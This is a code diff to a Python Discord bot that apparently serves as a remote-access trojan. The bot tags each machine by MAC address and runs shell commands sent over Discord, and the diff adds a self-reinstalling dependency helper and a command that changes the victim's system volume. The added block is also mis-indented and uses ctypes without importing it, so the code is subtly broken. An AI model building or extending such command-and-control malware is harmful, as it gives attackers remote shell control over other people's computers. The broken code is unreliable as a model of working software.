@@ -6,18 +6,26 @@ import discord
 import sys
 from settings import guildid, bottoken
 from uuid import getnode 
+import subprocess
 
 intents = discord.Intents.all()
 intents.members = True
 client = discord.Client(intents=intents)
 global mac_address
 mac_address = str(getnode())
+
+
+def install_dependency(module):
+    subprocess.check_call([sys.executable, "-m", "pip", "install", module])
+    python_executable = sys.executable
+    script_path = os.path.abspath(__file__)
+    os.execl(python_executable, python_executable, script_path)
+
 async def find_channel_by_name(guild, channel_name):
     for channel in guild.channels:
         if channel.name == channel_name:
             return channel
     return None
-
 
 @client.event
 async def on_ready():
@@ -76,5 +84,32 @@ async def on_message(message):
                 output = "No Output"
             embed = discord.Embed(title=f"Shell Command > {command}", description=f"```{output}```", color=0xfafafa)
             await message.reply(embed=embed)
+    # ADDED AUDIO MANIPULATION MODULE
+        elif message.content.lower().startswith(".lower"):
+            volume = message.content[7:]  # Extract volume value after the command
+        try:
+            volume = int(volume)  # Convert input to integer
+            if volume < 0 or volume > 100:
+                await message.channel.send("Please enter a volume between 0 and 100.")
+                return
+
+            if os.name == "posix":  # For macOS
+                os.system(f"osascript -e 'set volume output volume {volume}'")
+            elif os.name == "nt":  # For Windows
+                # Calculate volume level (0 to 65535)
+                volume_level = int(volume * 65535 / 100)
+                ctypes.windll.winmm.waveOutSetVolume(0, volume_level + (volume_level << 16))
+            else:
+                await message.channel.send("Your system is not supported for volume adjustment.")
+                return
+
+            await message.channel.send(f"Volume has been set to {volume}%.")
+
+        except ValueError:
+            await message.channel.send("Invalid volume value. Please enter a number between 0 and 100.")
+        except Exception as e:
+            await message.channel.send(f"An error occurred: {e}")
+            
+
 
 client.run(bottoken)
